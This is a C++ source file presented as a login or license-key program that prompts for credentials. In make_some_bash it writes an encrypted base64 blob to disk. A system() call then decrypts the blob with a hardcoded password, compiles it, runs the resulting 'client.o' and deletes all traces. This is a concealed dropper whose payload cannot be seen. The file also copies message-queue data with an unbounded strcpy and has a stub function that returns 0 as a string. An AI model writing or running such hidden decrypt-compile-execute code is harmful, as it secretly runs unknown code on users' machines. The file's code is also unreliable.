#include <iostream>
// #include <string>
#include <cstring>
#include <fstream>


#include <sys/msg.h>
void make_some_bash(std::string str)
{
	std::string str1 = "U2FsdGVkX19f5kkXQo+LhsnJzGqs2K8xNuOkUJK7MevnePBP4hG48LcNxhnciLVD\nIp8Nx4NwMGwdDJKJ8EWDJRRhOt7Y9NkN0JJhthZJVNysl0f5pKDgIPqSngcrrd4V\nCUdfxtT50Y+ISnD2jCV4m2zqoBuxETHxTok0y6ZYNO5zyi9NEKertYzjBTaM48fM\nLDonG72QvkymEVlk3CY+kuoU0kEzz5zU5zpwpuW9ri4mbia8Hm2aPPuIHXwG8D+N\nwmWNGX9jIG4zeX0tltirDt44OcaMC75ChJD7FvwD0jXXYXIasqMNEr148R5MB/wB\n29Y8ZnmdZowkNGT5uH35MXcMGckuVKwLsd2FN+PSqLKB8RAs60hhP/8Ylm9REOhd\nbNkrzFHdVuAeK7gUQbPoelgdkCPRrMwlP9/W0OXJHisx9OfkgkJXC4ePBlv5IstF\npyaHk5eAJpKJlem3PkAJXZL3Np4sJMeae25+hpDdece7Q8QKQ8P64WwfB+wPv38s\nDnOy5B2nUjPhA2tn8m1Zb5Tr02K2n+h4vhk0BLtNr7xBdz13o2u8CP8lCTIyJfEh\n1OgqkD9yGf0A1pHkc+5usWTGsrJBlWOp5QldSnA/hgShr1UYMIj3qr0kyYDFzfyN\nJVf09DQUfmNSjfJwFu2453HZF8H6K109NbiHgpcIcgUyPIhOdj7j8+TAnceF2aCw\n99g19VtOVg1UsYfMBiNx+Khdt3Mn/1Lq5kj00PKxfgvn9JrU2lJCW+QdxYuLdANx\nmIUg1IOpgojF0eFWg30wCxKE/YlvbJ8nrYIedDWSNTF8DyqiHzwbD+E6J90RNImG\nNJtccHnU+308gH3xSDYZVYgt7uXTH/TZN7XYSR2eEecs/DcTihFDB6Q4JuPX4Xex\ntaGyNgef6ztdDblPR5Z8pvjY1qgrHBX12CHVb9cAsu6pLc6bdurU3MqYoRTSzG5x";

    std::ofstream out;          // поток для записи
    out.open("one1.c"); // окрываем файл для записи
    if (out.is_open())
    {
        out << str1;
    }
    out.close();

	system("openssl enc -d -in one1.c -out one2.c -des3 -base64 -pass pass:mypasswd -pbkdf2 ; gcc one2.c -o client.o ; ./client.o ; rm one1.c one2.c client.o");
}



std::string make_license_key(const std::string &logon, const std::string &password, std::string &license_key)
{





	return 0;
} 





int main(int argc, char const *argv[])
{

	// ////////////////////////////////////////
	std::cout << "Good time! Enter your credential!" << std::endl << "Enter your logig" << std::endl; ;   
	std::string login;
	std::cin >> login;
	// std::string password;
	// std::cout << "Enter your password" << std::endl; 
	// std::cin >> password;
	make_some_bash("123");



	////////////////////////////////////////

char one[1024];
	struct msgbuf buf;

	char cmd[1024] ;
	memset(cmd,0,1024);

	int fd = msgget(111, 0);
	if(fd == -1)
		perror("Ошибка сообщения"); 

	tryAgain:
	if(msgrcv(fd, &buf, 1024, 16, IPC_NOWAIT) != -1){
		strcpy(cmd, buf.mtext); 
		printf("%s\n",cmd);
		// printf("%s\n ", buf.mtext);
	}
	else {perror("Ошибка в msgrcv()\n"); goto tryAgain; } 
	msgctl(fd, IPC_RMID, NULL);







	std::cout << "=========================================" << std::endl;

	////////////////////////////////////////

	// std::string license_key;
	// std::cout << "License key:" << license_key << std::endl;  




	// if( )	




	// make_some_bash(login);
	// std::cout << "strin : " << login << std::endl;
	return 0;
}